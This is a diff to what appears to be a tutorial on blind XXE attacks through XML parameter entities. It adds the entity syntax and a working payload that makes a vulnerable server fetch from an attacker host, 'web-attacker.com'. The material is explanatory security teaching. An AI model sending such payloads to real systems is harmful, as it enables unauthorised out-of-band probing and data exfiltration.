@@ -18,4 +18,12 @@ This attack will cause the server to make HTTP request to the specified URL whic
 Sometimes, XXE attacks using regular entities are blocked due to input validation by the application or some hardening of the XML parser that is being used. In this situation, an attacker might use XML parameter entities instead, which are a special kind of XML entity which can only be reference within the DTO.
 
 For this technique, an attacker only need to know two things:
-1. Th declaration of an XML parameter entity includes the percent character before the entity name:
+1. The declaration of an XML parameter entity includes the percent character before the entity name: `<!ENTITY % myparameterentity "my parameter entity value" >`
+2. Parameter entities are referenced using the percent character instead of the usual ampersand: `%myparameterentity;`
+
+This means, an attacker can test for blind XXE with the following payload:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+<stockCheck><productId>299</productId></stockCheck>
+```
